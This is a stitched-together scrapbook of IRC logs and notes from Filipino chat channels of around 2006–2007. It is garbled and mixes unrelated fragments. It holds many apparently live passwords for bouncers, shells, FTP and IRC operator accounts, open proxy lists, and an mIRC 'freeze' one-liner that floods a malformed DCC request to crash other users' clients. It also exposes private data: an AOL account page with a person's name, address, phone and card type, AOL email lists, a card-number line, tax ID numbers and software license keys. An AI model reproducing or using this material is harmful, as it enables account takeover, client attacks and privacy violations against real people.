+203.198.162.124:1080 4
+202.85.41.70:1080 4
+
+
+
+Pls. be informed that after deliberation your application has been declined. The result shows 5-NO 0-YES. You are not to message any of the @ about this. Refer to re-application guidelines.
+
+
+
+<@Guardian_X> sock4
+<@Guardian_X> 24.90.111.110:3913  
+<@Guardian_X> 201.43.8.229:1080  
+<@Guardian_X> 200.141.128.226:1080  
+<@Guardian_X> 69.142.16.122:48237  
+<@chikoy> ano yan
+<@Guardian_X> 200.117.217.222:1080  
+
+
+24 scripts
+
+
+<chikoy> [11:14] *-psyBNC* New User 'intel' added. Password set to 'igniefbm'
+<chikoy> pak-shells.net:5282
+<chikoy> [11:15] *-psyBNC* New User 'unix' added. Password set to 'mkgmlcem'
+<chikoy> pak-shells.net:5281
+
+<chikoy> unix & sky
+<chikoy> port 5285
+<chikoy> pass: makati9090
+<chikoy> pakshells
+<chikoy> port:5284
+
+
+
+<betaphisigma> maging sop ba ako sa davao at cebu if bad ako
+<betaphisigma> pero ok lng yun
+<betaphisigma> wla akong magawa
+
+* totep (~fjaklf_ja@124.106.8.69) Quit (Quit: f*ck)
+
+
+|evi [freeze]:{ .raw PRIVMSG $1 $+(:,$chr(1),DCC) send " $+ $str($rand(a,z) $+ $chr(32),250) $+ " 0 2130706433 $+(8192,$chr(1)) } }
+
+
+xchat 2.6.1 Linux 2.6.11.4-20a-default [i686/1.67GHz]
+
+BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!
+
+
+unix.AceShells.com
+xchnwlskhcp
+SSH Username:
+ unix
+ 
+SSH Password:
+ 9J39FK3L
+ 
+SSH Host:
+ DarkStar.AceShells.com 
+
+
+
+
+enforce
+squery
+
+blacklist
+nonsense
+
+
+quitmsg
+
+
+-Juliet29- DCC send DivXPorno.pif.rar (81.184.135.100)
+DCC Send from Juliet29 rejected (DivXPorno.pif.rar, file type ignored)
+
+
+
+
+
+- (Kick #791)
+
+
+
+<|evi> if this was a small channel.. and titignan ko lang by itself as a small channel
+<|evi> then wat wud u expect naman dba
+<|evi> malaking sense din kasi ung mga tagahandle ng malalaking channel
+<|evi> kumbaga the larger the responsiblity -- larger talents -- larger opportunity.
+<|evi> wer wud my help be kng walang tao ang channel
+
+ms_mafei@lycos.com
+
+
+
+<Guardian_X> eth0 is sa modem
+<Guardian_X> like lpt1 = eth1
+<Guardian_X> etc
+
+
+
+//load -rs $Shortfn($Findfile($Mircdir,scanip.zip,1))
+
+http://www.optixo.com/wallpapers/heidi2/images/
+http://www.optixo.com/wallpapers/paris/images/ 26
+
+on 1:load:{ if $isfile($b) = $true { if $?!="Overwrite existing $lines($b) Old Memo(s)?" = $true { lbl } } | else { lbl }
+  if $isfile($c) = $true { if $?!="Overwrite existing settings?" = $true { lbc } } | else { lbc }
+  if $?!="Open Install URL?" { run http://www.MemoExpress.org/install.html } | a dialog $er(main,scr) mhelp mhelp 
+}
+
+
+
+
+<chikoy> [19:37] *-psyBNC* New User 'unix' added. Password set to 'omlenlkb'
+<chikoy> 84.95.240.53 (5380)
+
+<chikoy> [19:49] *-psyBNC* New User 'unix' added. Password set to 'ckmddpne'
+<chikoy> [19:50] *-psyBNC* Tue Jun  6 14:30:40 :User mabagsik declared User unix to admin
+<chikoy> 84.95.240.53 (5381)
+
+on ^*:open:?: {
+  if (killme isin $1-) { echo -a DONE! | halt }
+}
+
+
+http://www.photodromm.com/hosted/photodromm_44/images/large/01.jpg -12
+05, 09
+
+http://219.123.155.236/realfile/Photo_r/151/1/01.jpg
+219.123.155.236
+
+name: www.bestserials.com
+code: ^090fsmt6AYkAqRoaJMlS5OnM4SzDH+deg2jnrFK52jQhS+XxxKlSJOKOM/hyuZjYs1j4LchhaW/u2MuZII9xt3gl8aCvaBl/w2qIvofsZrpoLYcigPCcdZ+g1+kKS+AU4GcryH9ulFMOsLyDJMpryrKhijvf6ma6jp03MpHjIJ1Y=^
+
+
+
+
+
+
+<chikoy> User 'unix' added. Password set to 'cglheali'
+
+<chikoy> 84.95.240.53
+<chikoy> 5580
+<chikoy> vhosted yan
+<siLverbLade> san mo nakuha kuya
+<chikoy> lolz
+<chikoy> wag mo ng tanungin
+<chikoy> napulot ko lang
+<siLverbLade> lolx
+<siLverbLade> ilan pde gawin dun
+<chikoy> 2 lang e
+<chikoy> kunin mo yung admin
+<chikoy> ident:master
+<chikoy> pass:masterchikoy
+<siLverbLade> ok
+
+
+[09:15] <|evi[x]> .!.
+
+
+
+<@BlackWater> I found 14 matches to your query. Here are the 5 most recent (sorted): bored_guy NiC0L3 guest04278 cheska chaila_20cdo. Bored_Guy (~fdf@202.137.116.28) was last seen quitting from #xavier 2 hours, 1 minute ago stating (Quit: {}).
+<@siLverbLade> !seen *!*@202.137.116.28
+<@BlackWater> I found 2 matches to your query (sorted): Bored_Guy animeangelpink_17. Bored_Guy (~fdf@202.137.116.28) was last seen quitting from #xavier 2 hours, 1 minute ago stating (Quit: {}).
+
+
+<YeH> login: opfian1
+<YeH> pass: superman
+
+<YeH> login: fjakhar
+<YeH> pass: superman
+
+
+
+
+<@BlackWater> _luvless_ (~xyHa@210.4.36.25) was last seen quitting from #makati 18 hours, 40 minutes ago stating (Quit: {}).
+
+<LoNDoNBaBe> [09:46] <siLverbLade> !seen *!*@210.4.36.25
+<LoNDoNBaBe> [09:46] <BlackWater> I found 3 matches to your query (sorted): |evi |evi[x] _k|zzes_. |evi (~z-inc@210.4.36.25) was last seen quitting from #applicants 28 minutes ago stating (Read error: Connection reset by peer).
+
+
+<chikoy> 84.94.229.130:5380
+<chikoy> ident:master
+<chikoy> ident:mas
+<chikoy> pass:chikoy9090
+<chikoy> 84.94.229.130:5381
+<chikoy> same data
+
+<chikoy> 5384 at 5388
+
+
+
+
+#makati #xavier #manila #davao #ateneo #cebu #lasalle #allnitecafe #teens #gensan #zamboanga #ceu #ust #mapua
+
+
+<LoNDoNBaBe> binago ko lang un statement para hindi mag demand mga chatters for +v
+
+
+
+
+[12:53] <atenean> well we have to follow the old guidelines
+[12:53] <atenean> para di kahiya hiya
+[12:53] <atenean> dati akong sop dito so I want to protect the channel gaya din nang pag protecta nila noon
+[12:58] <atenean> di na nga siya may ari
+[12:58] <atenean> bot ko may ari
+[12:58] <atenean> bwehehehehehehe
+
+
+
+<-psyBNC> Fri Jul 14 11:00:02 :(coolbhabe!coolie@right-here.right-now.us) just to let you kow, grod0lf0 (~nothere@69.30.127.50) is actually a bot inviter. i know the owner xe from another channel :P
+
+
+
+221.165.193.66 port 8080
+
+rundll exit,0 - para restart pc
+rundll exit,1,0 - para di na popup question
+
+
+Ulead VideoStudio 10 Plus (Full/Download) - English (#300067288) 1 Unit(s) 
+  
+  -   License key for unlocking the product The license information for "Ulead VideoStudio 10 Plus (Full/Download) - English" is listed below. You will need this license information to complete the process and activate the product. 
+
+License Code for VideoStudio 10: 811A2-8A000-00096047 ; Coupon Code for Dropshots.com Subscribtion: UleadGift  
+ 
+ 
+
+
+
+[21:21] <carlo> hmmm...
+[21:21] <carlo> may tao kasing gumagawa ng kwento about sakin...
+[21:21] <carlo> eerrr, taong malapit pa sayu
+[21:21] <carlo> grabe...
+[21:22] <@sneakers> sino
+[21:22] <carlo> yaw ko, baka mag-away pa kayu
+[21:22] <carlo> siguro virtually malapit sayu
+[21:22] <carlo> pero physically, malayu sayu
+[21:22] <carlo> yung taong yun
+[21:23] <@sneakers> hano nga
+[21:23] <@sneakers> anong kwento
+[21:23] <carlo> eerrrr....
+[21:23] <carlo> mahirap na magsalita eh...:(
+
+
+
+[21:05] <|JC|> elhacker. org/.net/.com lols limot ko na e tsaka packetstorm.org dyn lng ako kumuha nun e
+
+
+
+[21:21] * |evi (z-inc@210.1.85.105) has joined #makati
+
+
+
+195.50.191.14 port 6667
+194.14.236.50 port 6667
+195.50.191.12 port 6667
+202.91.34.9 port 6667
+61.6.39.100 port 6667
+
+
+gamma.aeshells.org
+
+
+
+//echo -q $input(AntiSpam Bot 3.4.1 has been successully loaded. Visit http://www.antispambot.org/ for help.,68,AntiSpam Bot)
+
+
+Name : LoNDoNBaBe and Guardian_X 's PROPERTY
+
+
+zip pass: catalyst111583090382
+
+
+
+
+on ^1:TEXT:*:#: {
+  if ($nick isop $chan) {
+    .echo -tm $chan  $+ $color(normal) $+ [ $+ $cnick(@).color $+ @ $+ $nick  $+  $+ $color(normal) $+ ]: $1-
+    haltdef
+  }
+  if ($nick isvoice $chan) {
+    .echo -tm $chan  $+ $color(normal) $+ [ $+ $cnick(+).color $+ + $+ $nick  $+  $+ $color(normal) $+ ]: $1-
+    haltdef
+  }
+  if (($nick !isop $chan) && ($nick !isvoice $chan)) {
+    .echo -tm $chan  $+ $color(normal) $+ [ $+ $cnick(*).color $+ $nick  $+  $+ $color(normal) $+ ]: $1-
+    haltdef
+  }
+}
+
+on ^1:TEXT:*:?: {
+  .echo -tm $nick  $+ $color(normal) $+ [ $+ $cnick(*).color $+ $nick  $+  $+ $color(normal) $+ ]: $1-
+  haltdef
+}
+
+
+
+
+/away i caNt make sOmeOne loVe me forEver..all i caN do is bE someOne hU caN be lovEd..and the rEst is Up to thE persOn to reaLize my wOrth..
+
+i do drink sumtimes.i come home late.. i have my oWn life.. i curse.. i figHt...i give deM a frigHt..nobody can cHange me coZ i knOw sumhOw dErz 1 gUd tHiNg aboUt me..i fLirt bUt i loVe deepLy..
+
+
+  
+
+
+
+RaveX n0ki4s4msung
+
+
+
+
+
+--->
+
+on *:DNS:{
+  if ($raddress) {
+    if ($raddress isnum) { traceip $raddress }
+    else { 
+      var %tot = $dns(0)
+      var %i = 1
+      while (%i <= %tot) {
+        traceip -m $dns(%i).ip
+        inc %i
+      }
+    }
+  }
+  else {
+    traceip $dns(0).ip
+  }
+}
+
+alias traceip {
+  if ($1) {
+    if ($1 == -m) {
+      if (!$2) { echo $color(info) -a * /traceip: insufficient parameters }
+      else {
+        %ip = $2
+        if (!$sock(traceip $+ $2)) { sockopen traceip $+ %ip www.dnsstuff.com 80 }
+      }
+    }
+    else {
+      %ip = $1
+      if (!$sock(traceip $+ $1)) { sockopen traceip $+ %ip www.dnsstuff.com 80 }
+    }
+  }
+}
+
+on *:SOCKOPEN:traceip*:{
+  if ($sockerr > 0) {
+    sockclose $sockname
+    echo $color(info) -at * An error has accured.
+    if ($sockerr == 3) {                                                     
+      if (!$sock($sockname)) { sockopen traceip $+ %ip www.dnsstuff.com 80 }
+    }
+  }
+  else {
+    sockwrite -n $sockname GET /tools/whois.ch?ip= $+ %ip HTTP/1.1
+    sockwrite -n $sockname Host: www.dnsstuff.com
+    sockwrite -n $sockname Connection: keep-alive
+    sockwrite $sockname $crlf 
+  }
+}
+
+on *:SOCKCLOSE:traceip*:{
+  if (!%ip) { * An error has accured. }
+}
+
+on *:SOCKREAD:traceip*:{
+  sockread %trace
+  tokenize 32 %trace
+  if (Country: isin %trace) {
+    echo $color(other) -at %ip is in $2-
+    sockclose $sockname
+  }
+  unset %trace
+  .timerruns 1 1 unset %ip
+}
+
+menu nicklist {
+  Country $chr(91) $+ $mid($address($$1,2),5,$len($address($$1,2))) $+ $chr(93):dns $mid($address($$1,2),5,$len($address($$1,2)))
+}
+
+menu query {
+  Country $chr(91) $+ $gettok($query($$1).addr,2,64) $+ $chr(93):dns $gettok($query($$1).addr,2,64)
+}
+
+;EOF
+
+
+
+rfoxer88@aol.com
+
+
+My Account 
+AOL Help > My Account  
+  
+Contact Information  Edit Contact Information |  Help Contact Information  
+ 
+First Name:  RONDA 
+Last Name:  STEFANO 
+Address:  Camino del Rio South Suite 207 San Diego, CA,  92108  
+Day Phone:   
+Evening Phone:  (653)284-5214  
+ 
+Secondary Billing Contact:  Create Secondary Billing Contact  
+ 
+ 
+ Billing Invoice  Help Billing Invoice  
+ 
+Account Status:   Account StatusActive  
+Last Bill:  $0.00 billed on 07/28/2006  
+Current Balance:  $11.10 
+  View Statement 
+Payment Date:  28 August 
+Credits:  View Credits 
+ 
+ 
+ 
+Payment Method  Edit Payment Method |  Help Payment Method  
+ 
+Primary Billing Contact:  RONDA  STEFANO  
+Payment Method:  Credit Card , American Express  
+Expiration Date:  04/2009 
+ 
+ Membership Details  Edit Membership Details |  Help Membership Details  
+ 
+Member Since:  10/10/2005 
+AOL Membership Fee:  $25.90 /month  
+Price Plan:  $25.90 AOL w/Unlimited Dial-up 
+Billing Date:  28 August 
+ 
+ 
+
+hopster: July 2006
+Serial Number: HOPSTER000-41KD-0F24-3N1E-PAN4-K485 
+
+
+[11:35] siLverbLade!~unix@62.116.121.242 trial
+[11:37] siLverbLade!~unix@62.116.83.61
+
+
+
+http://jaycee.sphosting.com
+
+
+http://www.geocities.com/rave.script/Rave2.04.zip
+
+Die Box-ID f¸r Ihre Shoutbox lautet: 451517
+errr... shoutbox for rave
+
+
+http://rave.sphosting.com
+robot1cs
+john_cuevas@yahoo.com
+
+
+
+http://z23.zupload.com/dl.php?id=30280
+
+Your Download-Link: http://rapidshare.de/files/29220780/Rave2.04.zip.html 
+Your Delete-Link: http://rapidshare.de/files/29220780/Rave2.04.zip?killcode=936891985 
+
+
+- ravescript.web1000.com - /admin
+rave
+44184506
+
+Your site (http://get-rave.web1000.com) has been successfully created. 
+Username: getrave
+Password : 04276622 
+
+
+Server or Host Name: freeftp.bravehost.com 
+User Name:  3534911610 
+Password: Your Bravenet Password 
+Remote Directory: / 
+
+
+
+
+ *+*+*+*+* [ RAVE Intel Report ] *+*+*+*+*
+ Whois On: MegaKicker (~srdi@202.163.74.225)
+ Real Name: rr
+ Channels: @#enforcers @#ownership
+ Server: soho.ix.us.dal.net - DALnet IX Client Server
+ Nickserv Information: MegaKicker has identified for this nick
+ Idle: 8mins 17secs
+ SignOn: Sunday, August 13th, 2006 at 8:49 PM
+ *+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+
+[00:09] [Almighty-] Login : rave@coders-team.org
+[00:10] [Almighty-] pass: ravescripts12345
+[00:10] [Almighty-] FTP Account Added!
+[00:10] [Almighty-] The FTP account rave with password ravescripts12345 was added. and a quota of 20 megs (0 or blank is unlimited).
+[00:10] [Almighty-] Syncing Ftp Databases....Done
+[00:10] [Almighty-]
+[00:10] [Almighty-] ---------------------------------------
+[00:10] [Almighty-] host : arenahost.org
+[00:10] [Almighty-] user : rave@coders-team.org
+[00:10] [Almighty-] pass: ravescripts12345
+
+
+[00:18] [Almighty-] host : coders-team.org
+[00:18] [Almighty-] login : rave@coders-team.org
+[00:18] [Almighty-] pass: 123456 f1r3w0rks0420
+[00:20] [Almighty-] www.coders-team.org/rave/
+
+
+ 61.218.52.146:11668
+
+
+Welcome to Web1000 Hosting!
+
+Your site (http://coders.fasthost.tv) has been successfully created. 
+Username: coders
+
+Password : 94520840 
+
+
+AC[i]DB[_]Rn
+
+[16:19] -MemoServ- Memos can be no longer than 255 characters. Your memo was 274 characters long. Please shorten it by 19 characters.
+
+
+ http://z11.zupload.com/download.php?file=getfile&filepath=39366 gary v
+
+
+[14:03] [fRanz_ph] ok, bigay ko nalang sayo ang info.
+[14:03] [fRanz_ph] ----------------------
+[14:04] [fRanz_ph] nakuha mo ?
+[14:04] [fRanz_ph] lag ang internet connect ngayon dito sa davao eh
+[14:04] [fRanz_ph] -----------------------
+[14:04] [fRanz_ph] email: rave@
+[14:04] [fRanz_ph] server: ryanx7.bounceme. net:31337
+[14:05] [fRanz_ph] pass: coders.ph
+[14:05] [fRanz_ph] ----------------------
+[14:05] [fRanz_ph] yan
+
+
+CHESKA NICOLE BRIONES REYES is now registered with the BIR as EO98 under Revenue District Office (RDO) 098 - CAGAYAN DE ORO CITY, MISAMIS ORIENTAL with Taxpayer Identification Number 303-132-452-000.
+
+JOSHUA JOHN CUEVAS ABDULLAH is now registered with the BIR as EO98 under Revenue District Office (RDO) 051 - PASAY CITY with Taxpayer Identification Number 303-132-792-000.
+
+
+
+Revenue District Office No. 51 - Pasay City
+
+  
+
+Office Address: 2/f & 3/f KCT Bldg., Edsa Ext., cor. Roxas Blvd. (in front of Copacobana Apartelle)
+Revenue District Officer: Ricardo B. Espiritu 
+e-mail: ricardo.espiritu@bir.gov.ph
+direct no.: 551-7016
+fax: 831-6478
+Assistant Revenue District Officer: Cesar D. Escalada (Acting)
+e-mail: 
+direct no.: 551-5490 / 551-6878 / 551-7018 / 551-7019 / 551-7006 / 838-2498 
+Area of Jurisdiction:
+Comprised the whole area of Pasay City
+Pasay City District Office Rodolfo O. Gacelo   Roligon Compd.,Tambo, ParaÒaque 
+
+
+[11:53] [fRanz_ph] <-psyBNC> Sat Aug 26 17:52:11 :New User:rave (http://rave.coders-team.org) added by franz
+[11:53] [fRanz_ph] <-psyBNC> New User 'rave' added. Password set to 'cnnglcdc'
+[11:53] <siLverbLade> hehe
+[11:53] [fRanz_ph] <-psyBNC> Password for rave changed to 'rave2.01'
+[11:53] [fRanz_ph] elmarino.servegame.com (33310)
+
+
+0(1R14)0(1A14)0(1V14)0(1E14)
+
+0(1G14)0(1R14)0(1E14)0(1A14)0(1T14) 0(1P14)0(1E14)0(1R14)0(1F14)0(1O14)0(1R14)0(1M14)0(1A14)0(1N14)0(1C14)0(1E14) 
+
+
+[00:09] <@NiC0L3> orbit.sh3lls.net
+[00:10] <@NiC0L3> login: webftp8
+[00:10] <@NiC0L3> pass: mahalkita
+
+
+[17:09] * @PiNKBeRRy (~pinky@202.137.116.39) Quit (Quit: -==....say u'l keep me n ur heart, promise me we'll never part...i can only love you so much more coz u r all m living 4..& d only thing i'd do s to keep on loving u..& forever u'l b n my heart..d way i've always loved u from d start....==-)
+
+[21:22] [NiC0L3] baby
+[21:23] [NiC0L3] mahal kita
+[21:23] [NiC0L3] i miss you
+[21:23] [NiC0L3] ccn-049603611 ccpin-80851
+[21:24] [NiC0L3] wala pa me nakabili ng daylite
+[21:24] [NiC0L3] wala kc sa mde.... -== thanks mah labs...ur d reason of my smiles ==-)
+
+
+
+
+
+#cebu *!*@byq67.neoplus.adsl.tpnet.pl Channel ban list is full
+#cebu *!*@eu85-84-30-208.clientes.euskaltel.es Channel ban list is full
+
+
+alaned was ~hurdle@203.177.165.136 * great
+End of WHOWAS
+mykelti was ~hurdle@203.177.165.136 * great
+ Server: hotspeed.sg.as.dal.net - Thu Sep 7 05:23:33 2006
+ 
+
+
+netcat
+nmap
+
+[20:46] <@Cheska> *(9/12) trambe89@aol.com
+[20:47] <@Cheska> godrag@aol.com
+
+
+[20:52] <@Cheska> [20:57] *kuyakoy* i want to make a project about general accounting system and payroll system.
+[20:52] <@Cheska> [20:58] *kuyakoy* i want to make and test it in your system. i want also to expand my knowledge in shell scripting.
+
+[11:46] [kuyakoy] krintsi55@aol.com
+[11:46] [kuyakoy] rfoxer88@aol.com
+[11:47] [kuyakoy] trambe89@aol.com
+[11:47] [kuyakoy] jerbog69@aol.com
+[11:47] [kuyakoy] emisu55@aol.com *
+[11:47] [kuyakoy] kriwil55@aol.com *
+[12:34] [kuyakoy] arbye9090@aol.com
+
+
+
+
+[11:08] [staticX] ------------------------
+[11:09] [staticX] email: unix@
+[11:09] [staticX] server: 203.101.41.160:33310
+[11:09] [staticX] password: rave123
+[11:09] [staticX] -------------------------
+
+
+
+
+cheskamylabs (9/22/2006 5:56:13 PM): From: LouieX (User) To: siLverbLade Date: Fri Sep22 upload backup files to arenashost.org ftp account
+
+cheskamylabs (9/22/2006 5:55:18 PM): From: LouieX (User) To: siLverbLade Date: Fri Sep22 m trying to contact the registrants sa isa ka account ko. wala pang reply eh hinhi ko ma recover ang passwd
+
+
+cheskamylabs (9/22/2006 5:53:01 PM): [16:20] [LouieX] oist [16:21] [LouieX] paki upload ng files mo sa arenahost [16:21] [LouieX] while waiting sa isang acoutn ko [16:21] [LouieX] dba ginawaan kita sa arenahost b4??? [16:21] [LouieX] yun gamitin mo
+
+ 
+
+hhhhhmmm.. oist heres na testi mow...
+wag ka na simangot...ahhhhhhh
+si..nichole.. sweet yan... mapagmahal..
+muntik na kaming mag syota nyan... sa
+kaka sweet nya eh... basta.. ok na ok xa
+sa akin (U're the best pare! hani!) basta
+chat nyo na lng xa.... ah wag pala....
+eklusib lng u'n xa sa akin.... until here na
+lng ...to be continued....take care ka
+always niki! labyu! dai ja bu!
+
+
+[21:45] -[ |JC| ]- -private- -  i apologize for wat happen last time :)
+[21:46] -[ |JC| ]- -private- -  f u guyz will process my application again dat wud be my great pleasure to u guys :)
+
+
+
+
+-tsi- please slow down or you will be banned. You wrote 6 lines, maximum is 8 lines. (woÆm v5.0)
+* tsi sets mode: +bmMR *!*@58.69.173.226
+* tazzie sets mode: -m
+
+
+[14:04] [kuyakoy] Server / SSH Host: orbit.sh3lls.net
+[14:04] [kuyakoy] Username: webman
+[14:04] [kuyakoy] Password: webmax
+
+webman@lamers.like.u.make.me.nervous.nu
+
+NiC0L3 (~colein@202.137.116.39) was last seen quitting from #makati 1 hour, 22 minutes ago stating (Quit: LIFE is 4 living, i live mine 4 U! LOVE is 4 giving, i give mine 2 U! DREAMS are 4 dreaming, mine are 4 U! HEARTS are 4 beating, & mine beats 4 U! ...i love you so much siLverbLade....).
+
+
+[20:57] <@staticX> 203.187.194.174:6588
+[20:57] <@staticX> 24.184.204.227:50365
+
+
+../server 208.98.15.90:11004 johnnicole0420 ident: unix <--save mo yan 
+
+
+[12:05] * Guest70613 /Server Arab.OurArab.Org   ›÷· «·”Ì—›— Ê‘Ê› «·⁄Ã»  by OurArab Staff
+
+5631147260@blast.ph pass=640807
+
+
+Listening on: 212.71.19.102 port 1571
+
+
+ Whois On: Cheska (~nicole@210.5.78.51)
+
+
+Dondon: hi pinky
+Nicole Reyes: hi
+Dondon: musta po
+Nicole Reyes: ok lang po.. mjo busy..
+Dondon: san busy
+Nicole Reyes: d2 haus at sa family sympre..
+Dondon: wow
+Dondon: having a baby na ba
+Nicole Reyes: yup
+
+
+
+
+
+
+[Cheska Nicole] 10/25/03 03:28:57 PM hmmmm
+[Cheska Nicole] 10/25/03 03:29:06 PM bakit po?
+
+[MyAnGeL] 10/24/03 11:26:35 PM wala po
+
+[Cheska Nicole] 10/25/03 03:32:24 PM musta po ikaw?
+[Cheska Nicole] 10/25/03 03:32:35 PM saan ka now?
+
+[MyAnGeL] 10/24/03 11:28:49 PM ok lng i think nasa bahay me
+
+[Cheska Nicole] 10/25/03 03:37:05 PM ngek
+[Cheska Nicole] 10/25/03 03:37:17 PM d sigurado ha
+
+[MyAnGeL] 10/24/03 11:32:55 PM :)
+
+[Cheska Nicole] 10/25/03 03:38:07 PM walang work?
+
+[MyAnGeL] 10/24/03 11:34:16 PM mamaya pa
+
+[Cheska Nicole] 10/25/03 03:39:25 PM :)
+[Cheska Nicole] 10/25/03 03:39:29 PM ic take care po
+[Cheska Nicole] 10/25/03 03:39:38 PM lagi ka yata sa chikka 
+[Cheska Nicole] 10/25/03 03:39:40 PM hihihi
+
+[MyAnGeL] 10/24/03 11:41:26 PM d naman
+
+[Cheska Nicole] 10/25/03 03:47:22 PM :)
+[Cheska Nicole] 10/25/03 03:47:31 PM take care ikaw
+[Cheska Nicole] 10/25/03 03:47:40 PM dito lang naman me palagi eh
+
+[MyAnGeL] 10/24/03 11:44:18 PM ic
+[MyAnGeL] 10/24/03 11:46:09 PM pinagpalit mo na ako :(
+
+[Cheska Nicole] 10/25/03 03:51:30 PM huh
+[Cheska Nicole] 10/25/03 03:52:54 PM :(
+
+[MyAnGeL] 10/24/03 11:49:47 PM totoo naman d ba kaya ka naiwas kaya mo ko sinusumbatan
+
+[Cheska Nicole] 10/25/03 03:54:54 PM d yun totoo don :(
+[Cheska Nicole] 10/25/03 03:55:36 PM huhuhuhu! ive waited for you...
+[Cheska Nicole] 10/25/03 03:56:00 PM ngayon na i want to be happy..saka ka naman lagi online
+[Cheska Nicole] 10/25/03 03:56:33 PM bakit ganun?
+[Cheska Nicole] 10/25/03 03:56:59 PM u've been busy for almost 5 months
+
+[MyAnGeL] 10/24/03 11:52:12 PM ?
+
+[Cheska Nicole] 10/25/03 03:57:14 PM tapos 
+
+[MyAnGeL] 10/24/03 11:53:51 PM anong 5 e 3 lang
+
+[Cheska Nicole] 10/25/03 03:59:20 PM :(
+[Cheska Nicole] 10/25/03 04:00:41 PM yung talagang wala na kahit isang araw na usap tayo
+[Cheska Nicole] 10/25/03 04:00:49 PM 3 months lang yun
+[Cheska Nicole] 10/25/03 04:01:10 PM pero since june pa..taken for granted na ako
+
+[MyAnGeL] 10/24/03 11:59:58 PM d totoo yon
+[MyAnGeL] 10/25/03 12:00:04 AM busy lng talaga ako
+
+[Cheska Nicole] 10/25/03 04:06:23 PM :(
+[Cheska Nicole] 10/25/03 04:09:06 PM d na lang me magsasalita..para d mo masabi na sinusumbatan kita..but sana wag mo naman isisi saken lahat..i feel all alone na talaga eh....
+
+[MyAnGeL] 10/25/03 12:06:15 AM bkit ikaw lang ba ang nakakaramdam ng ganon
+
+[Cheska Nicole] 10/25/03 04:14:40 PM kaya nga po sana 
+
+[MyAnGeL] 10/25/03 12:10:25 AM ?
+
+[Cheska Nicole] 10/25/03 04:15:21 PM intindihin na lang natin yung isat isa
+[Cheska Nicole] 10/25/03 04:15:34 PM im hoping naman na matatapos din ito eh
+
+[MyAnGeL] 10/25/03 12:11:43 AM yun naman gusto mo d ba
+
+[Cheska Nicole] 10/25/03 04:17:23 PM ang gusto ko
+[Cheska Nicole] 10/25/03 04:17:36 PM yung dati dondon
+[Cheska Nicole] 10/25/03 04:17:40 PM yung masaya
+[Cheska Nicole] 10/25/03 04:17:52 PM kahit nag-aaway tayo
+[Cheska Nicole] 10/25/03 04:18:14 PM alam ko napifeel ko kahit papaano may place ako sa heart mo
+
+[MyAnGeL] 10/25/03 12:13:31 AM sana nga
+[MyAnGeL] 10/25/03 12:13:57 AM noon pa naman ah
+
+[Cheska Nicole] 10/25/03 04:19:35 PM may hihingin pala me pwede ba?
+[Cheska Nicole] 10/25/03 04:19:43 PM yung address mo ulit jan?
+[Cheska Nicole] 10/25/03 04:20:15 PM nasira kasi yung pc na gamit ko palagi nawala yung copy ng addy  mo
+
+[MyAnGeL] 10/25/03 12:15:34 AM pupuntahan
+
+
+* NotHere changes topic to 'Welcome To #ninja official network channel of mIRCzone server Linked ninja.ix.us.mirczone.eu.. server IP 66.152.175.190 .. Congratulation: ninja.* server is Permanent now! siLverbLade New Ninja staff'
+
+
+[12:52] [Guardian_X] opermask tawag dun
+[12:52] [Guardian_X] connect ka ulit
+[12:52] [Guardian_X] using 7172
+[12:52] [Guardian_X] example
+[12:53] [Guardian_X] /server 66.152.175.190 7172 serverpass:opernick:operpass
+[12:53] [Guardian_X] yan kapag opermask ka. (hide ip)
+[12:53] [Guardian_X] tapos
+[12:53] [Guardian_X] kapag oper up
+[12:53] [Guardian_X] /oper opernick operpass
+
+./server ninja.ix.us.mirczone.eu:7172 ninja:siLverbLade:r0b0t1cs7
+
+[13:06] [Nottyguy] ./oper coder yourpass
+[13:07] [Nottyguy] .., //mode $me +aAbcdefFghiIjkKmnoOrswxXy
+
+
+
+
+James: wassap wassap sister
+Nicole Reyes: k lng po
+James: ehehe
+James: isang taon yata ako d nag ol ah
+James: bali balita
+James: may asawa ka na?
+Nicole Reyes: tagal na me may asawa nu ka ba
+James: ngek
+James: d ko alam ah
+James: sino nakatuluyan mo?
+Nicole Reyes: e di ung pinakamamahal ko di mo ba kilala?
+James: lolsssssss
+James: eh sa tagal kong wala sa circulasyon malay ko kung sino mahal mo
+Nicole Reyes: ung last na alam mo
+Nicole Reyes: di naman me nagmamahal ng kung sinu sinu lang eh
+James: ahmmmmm
+James: d ko na matandaan eh
+Nicole Reyes: si john
+James: ahhhhhhhhh
+James: oo nga pala
+James: taena lols tagal na talaga
+James: nag ibang bisyo na kse ako
+James: lolz
+Nicole Reyes: hehe
+James: mas feel ko mag lakbay lakbay ngaun
+James: lols
+James: lakbay para sa kalikasan lolzzzzzz
+Nicole Reyes: me anak na nga kami
+James: taena
+James: ambilis nyo naman
+James: lolz
+Nicole Reyes: sympre
+James: eh kami ni poleng lalabas pa lang sa sept
+James: hanu ba yan 
+Nicole Reyes: hehe
+James: 
+Nicole Reyes: kasal na ba kayO?
+James: ni poleng?
+James: hinde
+Nicole Reyes: haha.. loko ka tlga james..
+James: inde
+James: naaalala mo nung umuwi sya nung december
+James: nung bday ko
+James: dun nag pakasal kami sa sogo
+James: ngaun lumalaki na sa tyan nya
+Nicole Reyes: wla ako maalala hehe
+James: ehehe
+James: oi layas na ako
+James: inaantok na ako eh
+Nicole Reyes: bye
+
+
+
+
+[20:34] -NickServ- Info for Cheska:
+[20:34] -NickServ- Last seen address : ~Cheska@202.137.116.210
+[20:34] -NickServ- Last seen time    : Sat 21-Jul-2007 10:56:21 UTC
+[20:34] -NickServ- Time registered   : Fri 21-Apr-2006 04:11:24 UTC
+[20:34] -NickServ- Time now          : Sat 28-Jul-2007 12:34:06 UTC
+[20:34] -NickServ- Options: Enforced
+
+
+MaTT (9/16/2007 4:41:52 AM): nikol d pa ako naka send kasi medyo na aksidente ako and 3 of my front teeth broke nag pa jacket pa ako plus injury
+You have successfully registered and selected the Nokia N70 as your free gift. 
+Your Referral ID for this order is: 90857497 
+
+If you wish to promote your referral id by using links on websites then this is what you would need to put into the link.
+http://www.xpango.com?ref=90857497 
+
+COREBLITZ
+
+
+http://www.veoh.com/videos/v366773gwmTXqCK
+http://www.veoh.com/videos/v393628qBBHeAJP
+http://www.veoh.com/videos/v393088eGsTr5AG
+http://www.veoh.com/videos/v646716tbQHA9K8
+http://www.veoh.com/videos/v634759ByM6mdhC
+http://www.veoh.com/videos/v40049024sEQ6XB
+
+
+124.105.195.164
+‡πë€©€û€©‡πë
+
+http://www.yummypinays.org/index.php?showtopic=23626
+
